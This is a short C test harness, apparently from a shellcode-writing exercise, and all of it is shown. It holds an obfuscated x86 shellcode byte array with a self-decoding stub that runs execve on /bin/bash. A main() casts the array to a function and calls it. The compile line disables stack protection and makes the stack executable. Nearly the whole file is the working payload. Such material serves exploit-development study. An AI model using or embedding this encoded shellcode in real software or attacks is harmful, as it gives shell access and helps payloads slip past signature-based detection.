/*
 ExecveBashStack.c
By Abatchy
gcc ExecveBashStack.c -fno-stack-protector -z execstack -o ExecveBashStack.out
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = 
"\xeb\x16\x5e\x8d\x7e\x01\x31\xc0\x8a\x4c\x47\x01\x88\x4c\x06\x01\x40\x80\xe9\xbb\x74\x07\xeb\xf0\xe8\xe5\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x62\xaa\x61\xaa\x73\xaa\x68\xaa\x68\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x68\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb";

int main()
{
    printf("Shellcode size: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
